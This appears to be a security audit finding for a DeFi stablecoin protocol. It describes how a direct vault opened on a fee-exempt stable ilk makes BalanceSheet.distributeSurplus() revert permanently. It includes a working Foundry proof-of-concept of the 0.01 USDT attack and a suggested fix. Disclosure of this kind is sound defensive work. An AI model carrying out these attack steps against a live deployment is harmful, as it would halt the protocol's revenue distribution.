# Depositing fee-exempt stablecoin collateral into a vault without going through the `PegStabilityModule` blocks `BalanceSheet.distributeSurplus()`

## Summary

`BalanceSheet.distributeSurplus()` ships the fee income above the buffer target to the RAIN buyback, and before doing so it checks that the stable reserve covers the debt of every fee-exempt stable ilk. The reserve only records stablecoins that entered through the `PegStabilityModule`, while the debt side sums every vault on those ilks, and `VaultEngine.open()` lets anyone open a vault on a stable ilk and mint USDR against USDT without going through the `PegStabilityModule`. With a negligible amount of USDT, which it can immediately get back through `buyStable`, anyone can make the stable ilk's debt exceed the reserve for good, so `distributeSurplus()` reverts on every call and the protocol's fee income can no longer reach the RAIN buyback.

---

## Root Cause

`distributeSurplus()` compares two amounts before it lets any surplus leave. `reserveAccounting.totalReserve()` is the USDT and USDC that entered through `PegStabilityModule.sellStable()` and has not been redeemed. `stableDebt` is the total debt of every vault on a fee-exempt (`noFee`) ilk. Fee-exempt ilks are the stablecoin ilks, which are permanently barred from charging a stability fee so that one stablecoin always backs exactly one USDR. If `totalReserve` is smaller than `stableDebt`, the function reverts:

`BalanceSheet.sol::distributeSurplus()#L206-L223`
```solidity
if (address(reserveAccounting) != address(0)) {
    uint256 stableDebt;
    uint256 length = VAULT_ENGINE.ilkIdsLength();

    for (uint256 i; i < length; ++i) {
        bytes32 ilkId = VAULT_ENGINE.ilkIds(i);

        if (VAULT_ENGINE.noFee(ilkId)) {
            (uint256 globalArt, , uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);

            stableDebt += globalArt * rate;
        }
    }

    if (reserveAccounting.totalReserve() * _RAY < stableDebt) {
        _revert(ReserveBackingShortfall.selector);
    }
}
```

The comment directly above this block states its purpose:

`BalanceSheet.sol::distributeSurplus()#L201-L205`
```solidity
// Reserve-backing assertion: every fee-exempt (PSM stable) ilk's debt is the bookkeeping counterpart of
// stablecoins in the reserve, so the reserve must cover that debt before ANY surplus leaves the protocol. A
// shortfall means unbacked USDR was minted somewhere (e.g. a fee accrued on a stable ilk): distributing in
// that state converts the hole into permanently burned RAIN. Unlike the cases above this is a genuine alarm,
// not a keeper race, so it reverts loudly.
```

The check therefore assumes that every stablecoin backing debt on these ilks entered through the `PegStabilityModule`. In fact there are two ways to turn USDT into USDR, and the protocol books them differently.

Through the `PegStabilityModule`, `sellStable` joins the USDT in the `PegStabilityModule`'s own name, so it is credited to `collateral[ilkId][PegStabilityModule]`, locks it in the `PegStabilityModule`'s single vault `ilk.vaultId`, and records the same amount in `totalReserve`:

`PegStabilityModule.sol::sellStable()#L183-L188`
```solidity
COLLATERAL_ADAPTER.join(ilkId, address(this), stableAmt);
VAULT_ENGINE.frob(ilk.vaultId, address(this), address(this), int256(stableAmt18), int256(stableAmt18));
COLLATERAL_ADAPTER.exit(_USDR_ILK, user, stableAmt18);
...
RESERVE_ACCOUNTING.recordIncrease(stableAmt18);
```

Directly, a user runs the same sequence in their own name. `VaultEngine.open()` is permissionless and accepts any initialized ilk, stable ilks included (`VaultEngine.sol::open()#L280-L302`), so the user opens a vault of their own on the stable ilk; the USDT is credited to `collateral[ilkId][user]` instead of the `PegStabilityModule`, the debt is taken on the user's own `vaultId`, and no reserve is recorded:

```solidity
collateralAdapter.join(ilkId, user, amount);
uint256 vaultId = vaultEngine.open(ilkId, user);
vaultEngine.frob(vaultId, user, user, int256(amount18), int256(amount18));
collateralAdapter.exit(_USDR_ILK, user, amount18);
```

For the user the two paths are equivalent: stable ilks are exempt from the solvency gate in `frob`, their price is fixed at $1 with a 100% ratio, and they have no `dust` set, so one USDT yields one USDR either way. For the check they are not. The direct vault's debt is added to the ilk's `globalArt` and therefore to `stableDebt`, but it never passes through `recordIncrease`, which only the `PegStabilityModule` can call, so `totalReserve` does not move. The check then fails even though the new debt is fully collateralized by the user's own USDT sitting in the `CollateralAdapter`: it reports unbacked USDR where there is none.

---

## Impact

Once the stable ilk carries debt from a vault other than the `PegStabilityModule`'s, every call to `distributeSurplus()` reverts with `ReserveBackingShortfall`. Stability fees still accumulate on the Balance Sheet and remain available to heal bad debt, but the part above the buffer target can never be sent to the buyback receiver, so the RAIN buyback-and-burn that the protocol funds from its excess revenue stops completely.

A direct vault backed by just 0.01 USDT is enough to trigger this, and in the end it costs nothing but gas. The USDR minted from the direct vault is ordinary USDR, so the attacker can redeem it through `buyStable` in the same transaction and get its 0.01 USDT back; the `PegStabilityModule`'s vault debt and `totalReserve` both drop by the redeemed amount, while the attacker's vault debt stays on the ilk, so the gap between the two sides is unchanged. It does not even require a malicious actor: any user who borrows USDR against USDT directly in `VaultEngine`, instead of using the `PegStabilityModule`, blocks distribution in the same way.

The check only runs while `reserveAccounting` is set, and in a normal deployment it is set to the reserve accounting contract and can only be changed by the Balance Sheet's ward, which after the handover is the Governor and its timelock. To make `distributeSurplus()` work again, governance has to schedule `file("reserveAccounting", address(0))` so that execution skips the reverting block, wait out the timelock, and only then distribute; during that whole period the surplus cannot be distributed. Setting the address to zero does not switch off only the check: every piece of the Balance Sheet's logic that reads `reserveAccounting` stops working, namely the reserve-backing check, the lagged reserve snapshot, and the dynamic part of the buffer target, which falls back to the static floor. Turning it back on blocks distribution again as soon as any such vault exists. No funds are lost directly, but the protocol is forced to choose between a buyback that stays stopped and running the Balance Sheet permanently without the reserve-based safeguards this code was added to provide.

---

## Proof of Concept

1. Without the attack, `distributeSurplus()` sends the surplus above the buffer target to the buyback receiver; the state is then reverted to before the distribution.
2. The attacker deposits 0.01 USDT with `join`, opens its own vault on the USDT ilk and mints USDR from it with `frob`, without going through `sellStable`.
3. The attacker redeems that USDR through `buyStable` and gets all of its USDT back.
4. `distributeSurplus()` now reverts with `ReserveBackingShortfall`.
5. The surplus stays on the Balance Sheet and the buyback receiver gets nothing.

Create a new file `tests/DirectStableVaultBlocksDistribution.t.sol` and paste the code below into it:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.30;

import { BaseTest } from "./shared/BaseTest.sol";
import { IBalanceSheet } from "../contracts/interfaces/IBalanceSheet.sol";
import { _USDR_ILK, _WAD } from "../contracts/shared/Constants.sol";

contract DirectStableVaultBlocksDistributionTest is BaseTest {
    // RAIN stability fee from scripts/deploy-reserve.js: ~2% APY as a per-second factor [ray].
    uint256 internal constant RAIN_DUTY = 1000000000627937192491029810;

    // vaultUser's RAIN vault: 100,000 RAIN backing 10,000 USDR (1000% CR at $1, mat = 400%), so the stressed
    // worst-case loss stays at zero and the solvency gate stays open.
    uint256 internal constant VAULT_USER_INK = 100_000 * _WAD;
    uint256 internal constant VAULT_USER_ART = 10_000 * _WAD;

    // Stable reserve seeded through the PSM: 1,000 USDT (6 decimals).
    uint256 internal constant PSM_USER_USDT = 1_000 * 1e6;

    address internal vaultUser = makeAddr("vaultUser"); // borrows USDR against RAIN, paying the stability fee
    address internal psmUser = makeAddr("psmUser"); // deposits USDT into the PSM (the stable reserve)
    address internal attacker = makeAddr("attacker");
    address internal buybackReceiver = makeAddr("buybackReceiver"); // receives the surplus for RAIN buyback

    uint256 internal vaultUserVault;

    function setUp() public override {
        super.setUp();

        // Balance Sheet and stability fee wiring as in scripts/deploy-reserve.js.
        balanceSheet.file("humpRate", _WAD / 10);
        balanceSheet.file("reserveAccounting", address(reserveAccounting));
        balanceSheet.file("buybackReceiver", buybackReceiver);
        vaultEngine.file(RAIN_ILK, "duty", RAIN_DUTY);

        // Healthy RAIN price so the vault can be opened.
        _setRainPrice(1 * _WAD);

        // vaultUser opens a RAIN vault and borrows USDR.
        vaultUserVault = _openVault(vaultUser, VAULT_USER_INK, VAULT_USER_ART);

        // psmUser deposits USDT into the PSM, seeding the stable reserve.
        usdt.mint(psmUser, PSM_USER_USDT);
        vm.startPrank(psmUser);
        usdt.approve(address(psm), PSM_USER_USDT);
        psm.sellStable(USDT_ILK, psmUser, PSM_USER_USDT);
        vm.stopPrank();

        // One year of stability fees accrues on vaultUser's debt and is credited to the Balance Sheet as surplus.
        vm.warp(vm.getBlockTimestamp() + 365 days);
        vaultEngine.drip(RAIN_ILK);
    }

    function test_directStableVaultBlocksDistribution() public {
        uint256 snapshot = vm.snapshotState();

        // Without the attack, the fee income above the buffer target reaches the RAIN buyback.
        uint256 surplus = vaultEngine.usdr(address(balanceSheet));
        uint256 honestExcess = balanceSheet.distributeSurplus();
        assertGt(honestExcess, 0, "no surplus distributed without the attack");
        assertEq(vaultEngine.usdr(buybackReceiver), honestExcess, "buybackReceiver not paid");

        vm.revertToState(snapshot);

        // attacker mints USDR from its own USDT vault via join -> open -> frob, not through sellStable.
        uint256 attackerUsdt = 0.01e6;
        uint256 attackerUsdr = attackerUsdt * 1e12;
        usdt.mint(attacker, attackerUsdt);
        vm.startPrank(attacker);
        usdt.approve(address(collateralAdapter), attackerUsdt);
        collateralAdapter.join(USDT_ILK, attacker, attackerUsdt);
        uint256 attackerVault = vaultEngine.open(USDT_ILK, attacker);
        vaultEngine.frob(attackerVault, attacker, attacker, int256(attackerUsdr), int256(attackerUsdr));

        // attacker redeems it through buyStable and gets its USDT back for free.
        vaultEngine.hope(address(collateralAdapter));
        collateralAdapter.exit(_USDR_ILK, attacker, attackerUsdr);
        usdr.approve(address(psm), attackerUsdr);
        psm.buyStable(USDT_ILK, attacker, attackerUsdt);
        vm.stopPrank();
        assertEq(usdt.balanceOf(attacker), attackerUsdt, "attack cost the attacker USDT");

        // The stable ilk's debt now exceeds the PSM reserve, so every distribution reverts.
        vm.expectRevert(IBalanceSheet.ReserveBackingShortfall.selector);
        balanceSheet.distributeSurplus();

        // The fee income stays stuck on the Balance Sheet and the RAIN buyback receives nothing.
        assertEq(vaultEngine.usdr(address(balanceSheet)), surplus, "surplus left the Balance Sheet");
        assertEq(vaultEngine.usdr(buybackReceiver), 0, "buybackReceiver paid despite the attack");
    }

    // ---------- HELPERS ----------

    /// @dev Pushes `price` [wad] through the OSM (two pokes, one HOP apart) and into the Vault Engine's spot.
    function _setRainPrice(uint256 price) internal {
        rainPriceSource.setPrice(price);
        vm.warp(vm.getBlockTimestamp() + 1800);
        osm.poke(RAIN_ILK);
        vm.warp(vm.getBlockTimestamp() + 1800);
        osm.poke(RAIN_ILK);
        priceConverter.poke(RAIN_ILK);
    }

    /// @dev Opens a fresh RAIN vault for `who` with `ink` collateral and `art` debt.
    function _openVault(address who, uint256 ink, uint256 art) internal returns (uint256 vaultId) {
        rain.mint(who, ink);

        vm.startPrank(who);
        rain.approve(address(collateralAdapter), ink);
        collateralAdapter.join(RAIN_ILK, who, ink);
        vaultId = vaultEngine.open(RAIN_ILK, who);
        vaultEngine.frob(vaultId, who, who, int256(ink), int256(art));
        vm.stopPrank();
    }
}
```

---

## Recommendation

Compare the reserve only against the debt it actually backs, which is the debt of the `PegStabilityModule`'s own vault on each stable ilk, instead of the whole ilk's `globalArt`. The Balance Sheet does not know the `PegStabilityModule` today, so it needs a new `psm` address, set by the ward through `file`, and the loop reads each stable ilk's vault from it.

Import the interface and add the address next to `reserveAccounting`:

```diff
 import { IBalanceSheet } from "../interfaces/IBalanceSheet.sol";
+import { IPegStabilityModule } from "../interfaces/IPegStabilityModule.sol";
 import { IReserveAccounting } from "../interfaces/IReserveAccounting.sol";
 ...
     /// @inheritdoc IBalanceSheet
     IReserveAccounting public reserveAccounting;
 
+    /// @notice The PegStabilityModule whose vaults are backed by the stable reserve.
+    IPegStabilityModule public psm;
```

In `distributeSurplus()`, sum only the `PegStabilityModule`'s vault debt:

```diff
-        if (address(reserveAccounting) != address(0)) {
+        if (address(reserveAccounting) != address(0) && address(psm) != address(0)) {
             uint256 stableDebt;
             uint256 length = VAULT_ENGINE.ilkIdsLength();
 
             for (uint256 i; i < length; ++i) {
                 bytes32 ilkId = VAULT_ENGINE.ilkIds(i);
 
                 if (VAULT_ENGINE.noFee(ilkId)) {
-                    (uint256 globalArt, , uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);
+                    // Only the PegStabilityModule's own vault is backed by the reserve; other vaults on the ilk are
+                    // backed by their own collateral.
+                    (, , uint256 psmVaultId) = psm.ilks(ilkId);
+                    (, uint256 psmArt) = VAULT_ENGINE.urns(psmVaultId);
+                    (, , uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);
 
-                    stableDebt += globalArt * rate;
+                    stableDebt += psmArt * rate;
                 }
             }
```

This keeps the check sensitive to what it was written for, a stable ilk's rate drifting above `RAY` or the reserve ledger diverging from the `PegStabilityModule`'s vault, while debt from other vaults on the ilk, which is backed by their own collateral, no longer affects it. Alternatively, if stable ilks are meant to be used only through the `PegStabilityModule`, `VaultEngine.frob()` can reject any debt increase on a fee-exempt ilk from a vault other than the `PegStabilityModule`'s.
